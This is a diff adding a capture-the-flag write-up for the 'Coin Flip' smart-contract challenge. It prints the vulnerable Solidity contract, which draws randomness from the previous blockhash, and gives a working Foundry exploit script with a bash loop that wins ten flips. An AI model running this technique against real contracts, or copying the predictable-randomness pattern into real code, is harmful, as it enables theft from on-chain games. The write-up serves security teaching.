@@ -228,3 +228,140 @@ Once the transaction is confirmed, submit the instance to complete the challenge
 ![Well done image](assets/fallout-img3.png)
 
 ---
+---
+
+## 3. Coin Flip
+The goal is to correctly predict the coin flip 10 times in a row. The contract uses the previous blockhash as the flip outcome. We can easily solve this challenge by deploying a custom contract simulating the exact same coin flipping logic and calling the real challenge contract with this result.
+
+**Vulnerability:** The contract uses blockhash(block.number - 1) for randomness, which can be predicted.
+
+### Smart Contract Analysis
+`CoinFlip.sol`
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract CoinFlip {
+    uint256 public consecutiveWins;
+    uint256 lastHash;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; // *
+
+    constructor() {
+        consecutiveWins = 0;
+    }
+
+    function flip(bool _guess) public returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1)); // *
+
+        if (lastHash == blockValue) {
+            revert();
+        }
+
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        if (side == _guess) {
+            consecutiveWins++;
+            return true;
+        } else {
+            consecutiveWins = 0;
+            return false;
+        }
+    }
+}
+```
+
+### 🔍 Identifying the Vulnerability
+
+- The contract relies on blockhash(block.number - 1) for randomness.
+- Since we can calculate this value before calling flip(), we can always guess correctly.
+- This makes the game completely predictable and breakable.
+
+**Have a look after this, for a better understanding**
+ [Entropy Illusion by Mastering Ethereum Book](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#entropy-illusion)
+
+**Additional Things to look up if you'r interested in `Entropy`. I feel these videos are very interesting and I learnt many interesting things about `Entropy`.**
+- [What is entropy? - Jeff Phillips -by TED-Ed](https://www.youtube.com/watch?v=YM-uykVfq_E&t=0s)
+- [The Most Misunderstood Concept in Physics -by Veritasium](https://www.youtube.com/watch?v=DxL2HoqLbyA)
+
+### 🔹 Exploiting the Vulnerability
+**Exploit Strategy**
+
+    - ✅ Step 1: Calculate blockhash(block.number - 1).
+
+    - ✅ Step 2: Divide it by FACTOR to get the expected outcome (0 or 1).
+
+    - ✅ Step 3: Call flip() with the correct guess.
+
+    - ✅ Step 4: Repeat this for 10 blocks to win.
+
+### Foundry Exploit Script
+`CoinFlipSolution.s.sol`
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../src/CoinFlip.sol";
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
+
+// Player contract to automate flipping
+contract Player {
+    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(CoinFlip _coin) {
+        uint256 predictedHash = uint256(blockhash(block.number - 1));
+        uint256 predictedNumber = predictedHash / FACTOR;
+        bool side = predictedNumber == 1 ? true : false;
+        _coin.flip(side);
+    }
+}
+
+contract CoinFlipSolution is Script {
+    CoinFlip public coin = CoinFlip(0xb70c360f7EC4bF2B04eCE62abba1963dDd405Ca9);
+
+    function run() external {
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        new Player(coin);
+        console.log("Consecutive Wins: ", coin.consecutiveWins());
+        vm.stopBroadcast();
+    }
+}
+```
+**Running the Exploit (Single Execution)**
+
+```bash
+forge script script/CoinFlipSolution.s.sol --tc CoinFlipSolution --rpc-url $INFURA_URL --broadcast
+```
+
+- Each time this script runs, it flips the coin once with a guaranteed win.
+- But we need 10 wins in 10 blocks, so we repeat this execution 10 times.
+
+**Automating the Attack with a Bash Script**
+
+Since flip() only works once per block, we automate the process:
+```bash
+#!/bin/bash
+for i in {1..10}
+do
+  forge script script/CoinFlipSolution.s.sol --rpc-url $INFURA_URL --broadcast
+  sleep 12  # Wait for the next Ethereum block
+done
+```
+
+**After running the script 10 times, check your win count:**
+```bash
+forge script script/CoinFlipSolution.s.sol --rpc-url $INFURA_URL --broadcast
+```
+**If consecutiveWins == 10, submit the instance and finish the challenge!**
+
+![wins image](assets/coinflip-1.png)
+
+### Lessons Learned
+-	❌ Never use blockhash(block.number - 1) for randomness → It can be predicted.
+-	✅ Use Chainlink VRF for true randomness.
+-	✅ Attackers can automate brute-force exploits using off-chain scripts.
+
+### Once the transaction is confirmed, submit the instance to complete the challenge!
+![Well done img](assets/coinflip-2.png)
